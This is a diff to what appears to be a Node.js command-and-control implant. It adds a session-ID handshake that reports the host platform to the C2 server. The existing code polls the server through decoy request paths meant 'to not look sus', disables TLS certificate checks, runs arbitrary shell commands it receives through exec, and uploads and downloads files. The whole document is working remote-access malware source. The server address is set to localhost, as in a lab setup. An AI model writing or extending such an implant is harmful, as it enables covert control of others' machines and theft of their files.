@@ -4,11 +4,13 @@
 const https = require('https');
 const exec = require('child_process').exec;
 const fs = require('fs');
-const process = require('process')
+const process = require('process');
 
-const HOST = "127.0.0.1"
-const PORT = 1337
+const HOST = "127.0.0.1";
+const PORT = 1337;
 const C2_SERVER = `https://${HOST}:${PORT}`;
+let firstReq = true
+
 
 //get requests to not look sus
 const getRequests = [
@@ -46,6 +48,16 @@ const postRequests = [
 
 //ignore cert security
 process.env["NODE_TLS_REJECT_UNAUTHORIZED"] = 0;
+
+function generateSessionID() {
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    let result = '';
+    for (let i = 0; i < 16; i++) {
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+
+    return result
+}
 
 function uploadFile(file) {
     https.get(`${C2_SERVER}/upload.php/${file}`, (res) => {
@@ -98,46 +110,75 @@ function downloadFile(file) {
 }
 
 function pollServer() {
-    const requestPath = getRequests[Math.floor(Math.random() * getRequests.length)];
-    https.get(`${C2_SERVER}/${requestPath}`, (res) => {
-        let data = '';
 
-        res.on('data', chunk => {
-            data += chunk;
-        });
+    // generate sessionID on first request
+    if (firstReq) {
+        sessionid = generateSessionID()
+        let platform = process.platform.toString()
+        console.log(`${C2_SERVER}/cookie_id=${sessionid},${platform}`);
+        https.get(`${C2_SERVER}/cookie_id=${sessionid},${platform}`, (res) => {
+            let data = '';
 
-        res.on('end', () => {
-            //data = data.trim();
-            if (data && data !== '204 - No Content') {
-                console.log('Recieved command: ', data);
-                if (data == "getpid") {
-                    sendOutput(process.pid.toString())
-                } else if (data == "kill") {
-                    process.kill(process.pid, "SIGINT");
-                } else if (data.split(' ')[0] == "upload") {
-                    uploadFile(data.split(' ')[1]);
-                } else if (data.split(' ')[0] == "download") {
-                    downloadFile(data.split(' ')[1]);
-                } else {
-                    exec(data, (error, stdout, stderr) => {
-                        if (error) {
-                            console.error(`Error executing command: ${error.message}`);
-                            sendOutput(`Error: ${error.message}`);
-                        } else {
-                            console.log(data)
-                            sendOutput(stdout || stderr);
-                        }
-                    });
+            res.on('data', chunk => {
+                data += chunk;
+            });
+
+            res.on('end', () => {
+                console.log(data);
+                if (data && data == "Connection Initiated") {
+                    console.log(`Session started with SessionID: ${sessionid}`);
+                    firstReq = false;
                 }
-                
-                
-            } else {
-                console.log('No command recieved.')
-            }
+
+            });
+
+        }).on('error', err => {
+            console.error(`Error initiating connection to C2 server: ${err.message}`);
         });
-    }).on('error', err => {
-        console.error(`Error connecting to C2 server: ${err.message}`);
-    });
+    } else {
+        const requestPath = getRequests[Math.floor(Math.random() * getRequests.length)];
+        https.get(`${C2_SERVER}/${requestPath}`, (res) => {
+            let data = '';
+    
+            res.on('data', chunk => {
+                data += chunk;
+            });
+    
+            res.on('end', () => {
+                //data = data.trim();
+                if (data && data !== '204 - No Content') {
+                    console.log('Recieved command: ', data);
+                    if (data == "getpid") {
+                        let pid = process.pid.toString()
+                        let pname = process.title.toString()
+                        sendOutput(`PID: ${pid} - ${pname}`)
+                    } else if (data == "kill") {
+                        process.kill(process.pid, "SIGINT");
+                    } else if (data.split(' ')[0] == "upload") {
+                        uploadFile(data.split(' ')[1]);
+                    } else if (data.split(' ')[0] == "download") {
+                        downloadFile(data.split(' ')[1]);
+                    } else {
+                        exec(data, (error, stdout, stderr) => {
+                            if (error) {
+                                console.error(`Error executing command: ${error.message}`);
+                                sendOutput(`Error: ${error.message}`);
+                            } else {
+                                console.log(data)
+                                sendOutput(stdout || stderr);
+                            }
+                        });
+                    }
+                } else {
+                    console.log('No command recieved.')
+                }
+            });
+        }).on('error', err => {
+            console.error(`Error connecting to C2 server: ${err.message}`);
+        });
+    }
+
+    
 }
 
 function sendOutput(output) {
@@ -165,5 +206,7 @@ function sendOutput(output) {
     req.write(postData);
     req.end();
 }
+
+
 
 setInterval(pollServer, 5000);
